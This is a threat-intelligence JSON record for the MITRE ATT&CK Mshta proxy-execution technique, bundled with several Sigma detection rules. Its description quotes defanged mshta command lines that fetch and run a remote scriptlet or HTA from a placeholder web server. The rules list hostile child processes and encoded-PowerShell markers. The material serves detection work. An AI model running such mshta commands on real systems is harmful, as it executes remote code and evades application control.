{
    "type": "malware-behavior",
    "spec_version": "2.1",
    "id": "malware-behavior--769882a6-87ec-4462-bb3d-a50e5b232c45",
    "created": "2024-08-13T14:46:36.976135Z",
    "modified": "2024-08-13T14:46:45.221226Z",
    "name": "System Binary Proxy Execution: Mshta",
    "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code [1] [2] [3] [4] [5] Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. [6] HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. [7]Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute('GetObject(''script:https[:]//webserver/payload[.]sct'')'))They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [8]",
    "object_marking_refs": [
        "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
    ],
    "external_references": [
        {
            "source_name": "MITRE ATT&CK",
            "url": "https://attack.mitre.org/techniques/T1218/005",
            "external_id": "T1218/005"
        }
    ],
    "x_mitre_detection_rules": [
        {
            "author": "@SBousseaden (detection), Thomas Patzke (rule)",
            "date": "2019/02/01",
            "description": "Detects remote thread creation from CACTUSTORCH as described in references.",
            "detection": {
                "condition": "selection",
                "selection": {
                    "SourceImage|endswith": [
                        "\\System32\\cscript.exe",
                        "\\System32\\wscript.exe",
                        "\\System32\\mshta.exe",
                        "\\winword.exe",
                        "\\excel.exe"
                    ],
                    "StartModule": null,
                    "TargetImage|contains": "\\SysWOW64\\"
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "2e4e488a-6164-4811-9ea1-f960c7359c40",
            "level": "high",
            "logsource": {
                "category": "create_remote_thread",
                "product": "windows"
            },
            "modified": "2023/05/05",
            "references": [
                "https://twitter.com/SBousseaden/status/1090588499517079552",
                "https://github.com/mdsecactivebreach/CACTUSTORCH"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.execution",
                "attack.t1055.012",
                "attack.t1059.005",
                "attack.t1059.007",
                "attack.t1218.005"
            ],
            "title": "HackTool - CACTUSTORCH Remote Thread Creation"
        },
        {
            "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
            "date": "2019/02/11",
            "description": "Detects a potentially suspicious parent of \"csc.exe\", which could be a sign of payload delivery.",
            "detection": {
                "condition": "selection_img and 1 of selection_parent_* and not 1 of filter_main_* and not 1 of filter_optional_*",
                "filter_main_programfiles": {
                    "ParentImage|startswith": [
                        "C:\\Program Files (x86)\\",
                        "C:\\Program Files\\"
                    ]
                },
                "filter_main_sdiagnhost": {
                    "ParentImage": "C:\\Windows\\System32\\sdiagnhost.exe"
                },
                "filter_main_w3p": {
                    "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe"
                },
                "filter_optional_ansible": {
                    "ParentCommandLine|contains": [
                        "JwB7ACIAZgBhAGkAbABlAGQAIgA6AHQAcgB1AGUALAAiAG0AcwBnACIAOgAiAEEAbgBzAGkAYgBsAGUAIAByAGUAcQB1AGkAcgBlAHMAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAdgAzAC4AMAAgAG8AcgAgAG4AZQB3AGUAcgAiAH0AJw",
                        "cAewAiAGYAYQBpAGwAZQBkACIAOgB0AHIAdQBlACwAIgBtAHMAZwAiADoAIgBBAG4AcwBpAGIAbABlACAAcgBlAHEAdQBpAHIAZQBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHYAMwAuADAAIABvAHIAIABuAGUAdwBlAHIAIgB9ACcA",
                        "nAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnA"
                    ]
                },
                "filter_optional_chocolatey": {
                    "ParentImage": "C:\\ProgramData\\chocolatey\\choco.exe"
                },
                "filter_optional_defender": {
                    "ParentCommandLine|contains": "\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection"
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\csc.exe"
                    },
                    {
                        "OriginalFileName": "csc.exe"
                    }
                ],
                "selection_parent_generic": {
                    "ParentImage|endswith": [
                        "\\cscript.exe",
                        "\\excel.exe",
                        "\\mshta.exe",
                        "\\onenote.exe",
                        "\\outlook.exe",
                        "\\powerpnt.exe",
                        "\\winword.exe",
                        "\\wscript.exe"
                    ]
                },
                "selection_parent_powershell": {
                    "ParentCommandLine|contains": [
                        "-Encoded ",
                        "FromBase64String"
                    ],
                    "ParentImage|endswith": [
                        "\\powershell.exe",
                        "\\pwsh.exe"
                    ]
                },
                "selection_parent_susp_location": [
                    {
                        "ParentCommandLine|re": "([Pp]rogram[Dd]ata|%([Ll]ocal)?[Aa]pp[Dd]ata%|\\\\[Aa]pp[Dd]ata\\\\([Ll]ocal([Ll]ow)?|[Rr]oaming))\\\\[^\\\\]{1,256}$"
                    },
                    {
                        "ParentCommandLine|contains": [
                            ":\\PerfLogs\\",
                            ":\\Users\\Public\\",
                            ":\\Windows\\Temp\\",
                            "\\Temporary Internet"
                        ]
                    },
                    {
                        "ParentCommandLine|contains|all": [
                            ":\\Users\\",
                            "\\Favorites\\"
                        ]
                    },
                    {
                        "ParentCommandLine|contains|all": [
                            ":\\Users\\",
                            "\\Favourites\\"
                        ]
                    },
                    {
                        "ParentCommandLine|contains|all": [
                            ":\\Users\\",
                            "\\Contacts\\"
                        ]
                    },
                    {
                        "ParentCommandLine|contains|all": [
                            ":\\Users\\",
                            "\\Pictures\\"
                        ]
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2024/05/27",
            "references": [
                "https://www.uptycs.com/blog/warzonerat-can-now-evade-with-process-hollowing",
                "https://reaqta.com/2017/11/short-journey-darkvnc/",
                "https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/yellow-liderc-ships-its-scripts-delivers-imaploader-malware.html"
            ],
            "status": "test",
            "tags": [
                "attack.execution",
                "attack.t1059.005",
                "attack.t1059.007",
                "attack.defense_evasion",
                "attack.t1218.005",
                "attack.t1027.004"
            ],
            "title": "Csc.EXE Execution Form Potentially Suspicious Parent"
        },
        {
            "author": "E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community",
            "date": "2019/10/24",
            "description": "Detects execution of javascript code using \"mshta.exe\".",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains": "javascript"
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\mshta.exe"
                    },
                    {
                        "OriginalFileName": "MSHTA.EXE"
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "67f113fa-e23d-4271-befa-30113b3e08b1",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/02/07",
            "references": [
                "https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html",
                "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.005/T1218.005.md"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.005"
            ],
            "title": "Suspicious JavaScript Execution Via Mshta.EXE"
        },
        {
            "author": "Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule)",
            "date": "2019/02/22",
            "description": "Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism",
            "detection": {
                "condition": "selection",
                "selection": {
                    "Image|endswith": "\\mshta.exe",
                    "CommandLine|contains": [
                        "vbscript",
                        ".jpg",
                        ".png",
                        ".lnk",
                        ".xls",
                        ".doc",
                        ".zip",
                        ".dll"
                    ]
                }
            },
            "falsepositives": [
                "False positives depend on scripts and administrative tools used in the monitored environment"
            ],
            "id": "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2022/11/07",
            "references": [
                "http://blog.sevagas.com/?Hacking-around-HTA-files",
                "https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356",
                "https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script",
                "https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997",
                "https://twitter.com/mattifestation/status/1326228491302563846"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1140",
                "attack.t1218.005",
                "attack.execution",
                "attack.t1059.007",
                "cve.2020.1599"
            ],
            "title": "MSHTA Suspicious Execution 01"
        },
        {
            "author": "Markus Neis",
            "date": "2018/06/07",
            "description": "Detects potential LethalHTA technique where the \"mshta.exe\" is spawned by an \"svchost.exe\" process",
            "detection": {
                "condition": "selection",
                "selection": {
                    "Image|endswith": "\\mshta.exe",
                    "ParentImage|endswith": "\\svchost.exe"
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "ed5d72a6-f8f4-479d-ba79-02f6a80d7471",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/02/07",
            "references": [
                "https://codewhitesec.blogspot.com/2018/07/lethalhta.html"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.005"
            ],
            "title": "Potential LethalHTA Technique Execution"
        },
        {
            "author": "Michael Haag",
            "date": "2019/01/16",
            "description": "Detects a suspicious process spawning from an \"mshta.exe\" process, which could be indicative of a malicious HTA script execution",
            "detection": {
                "condition": "all of selection*",
                "selection_child": [
                    {
                        "Image|endswith": [
                            "\\cmd.exe",
                            "\\powershell.exe",
                            "\\pwsh.exe",
                            "\\wscript.exe",
                            "\\cscript.exe",
                            "\\sh.exe",
                            "\\bash.exe",
                            "\\reg.exe",
                            "\\regsvr32.exe",
                            "\\bitsadmin.exe"
                        ]
                    },
                    {
                        "OriginalFileName": [
                            "Cmd.Exe",
                            "PowerShell.EXE",
                            "pwsh.dll",
                            "wscript.exe",
                            "cscript.exe",
                            "Bash.exe",
                            "reg.exe",
                            "REGSVR32.EXE",
                            "bitsadmin.exe"
                        ]
                    }
                ],
                "selection_parent": {
                    "ParentImage|endswith": "\\mshta.exe"
                }
            },
            "falsepositives": [
                "Printer software / driver installations",
                "HP software"
            ],
            "id": "03cc0c25-389f-4bf8-b48d-11878079f1ca",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/02/06",
            "references": [
                "https://www.trustedsec.com/july-2015/malicious-htas/"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.005",
                "car.2013-02-003",
                "car.2013-03-001",
                "car.2014-04-003"
            ],
            "title": "Suspicious MSHTA Child Process"
        },
        {
            "author": "Nasreddine Bencherchali (Nextron Systems)",
            "date": "2022/08/08",
            "description": "Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains": [
                        "http://",
                        "https://",
                        "ftp://"
                    ]
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\mshta.exe"
                    },
                    {
                        "OriginalFileName": "MSHTA.EXE"
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "b98d0db6-511d-45de-ad02-e82a98729620",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/02/06",
            "references": [
                "https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.execution",
                "attack.t1218.005"
            ],
            "title": "Remotely Hosted HTA File Executed Via Mshta.EXE"
        }
    ]
}